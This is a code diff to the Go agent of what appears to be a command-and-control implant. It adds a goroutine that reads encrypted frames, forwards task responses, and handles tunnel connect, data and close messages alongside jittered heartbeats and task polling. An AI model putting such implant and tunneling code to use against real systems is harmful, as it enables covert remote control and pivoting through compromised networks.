@@ -90,6 +90,58 @@ func runSession(cfg *Config) error {
 	heartbeatInterval := time.Duration(hsResp.HeartbeatInterval) * time.Second
 	jitterPercent := int(hsResp.JitterPercent)
 
+	// Channel to receive task responses from the reader goroutine
+	taskResponseCh := make(chan protocol.TaskResponse, 1)
+
+	// === READER GOROUTINE ===
+	// Continuously reads frames from the server. Tunnel messages are handled
+	// immediately; task responses are forwarded to the main loop via channel.
+	go func() {
+		for {
+			msgType, plaintext, err := RecvFrame(conn, sessionKey)
+			if err != nil {
+				log.Printf("[-] Reader error: %v", err)
+				close(taskResponseCh)
+				return
+			}
+
+			switch msgType {
+			case protocol.MsgTaskResponse:
+				var taskResp protocol.TaskResponse
+				if err := protocol.Deserialize(plaintext, &taskResp); err != nil {
+					log.Printf("[-] Deserialize task response: %v", err)
+					continue
+				}
+				select {
+				case taskResponseCh <- taskResp:
+				default:
+					log.Printf("[-] Task response channel full, dropping")
+				}
+
+			case protocol.MsgTunnelConnect:
+				var msg protocol.TunnelConnect
+				if err := protocol.Deserialize(plaintext, &msg); err != nil {
+					continue
+				}
+				go handleTunnelConnect(msg, conn, sessionKey)
+
+			case protocol.MsgTunnelData:
+				var msg protocol.TunnelData
+				if err := protocol.Deserialize(plaintext, &msg); err != nil {
+					continue
+				}
+				go handleTunnelData(msg)
+
+			case protocol.MsgTunnelClose:
+				var msg protocol.TunnelClose
+				if err := protocol.Deserialize(plaintext, &msg); err != nil {
+					continue
+				}
+				handleTunnelClose(msg)
+			}
+		}
+	}()
+
 	// === MAIN LOOP (uses session key) ===
 
 	for {
@@ -101,28 +153,21 @@ func runSession(cfg *Config) error {
 			Timestamp: time.Now().Unix(),
 		}
 		if err := SendFrame(conn, protocol.MsgHeartbeat, hb, sessionKey); err != nil {
+			cleanupAllTunnels()
 			return fmt.Errorf("send heartbeat: %w", err)
 		}
 
 		// Poll for tasks
 		tr := protocol.TaskRequest{AgentID: cfg.AgentID}
 		if err := SendFrame(conn, protocol.MsgTaskRequest, tr, sessionKey); err != nil {
+			cleanupAllTunnels()
 			return fmt.Errorf("send task request: %w", err)
 		}
 
-		msgType, plaintext, err := RecvFrame(conn, sessionKey)
-		if err != nil {
-			return fmt.Errorf("read task response: %w", err)
-		}
-
-		if msgType != protocol.MsgTaskResponse {
-			continue
-		}
-
-		var taskResp protocol.TaskResponse
-		if err := protocol.Deserialize(plaintext, &taskResp); err != nil {
-			log.Printf("[-] Deserialize task response: %v", err)
-			continue
+		taskResp, ok := <-taskResponseCh
+		if !ok {
+			cleanupAllTunnels()
+			return fmt.Errorf("reader goroutine terminated")
 		}
 
 		for _, task := range taskResp.Tasks {
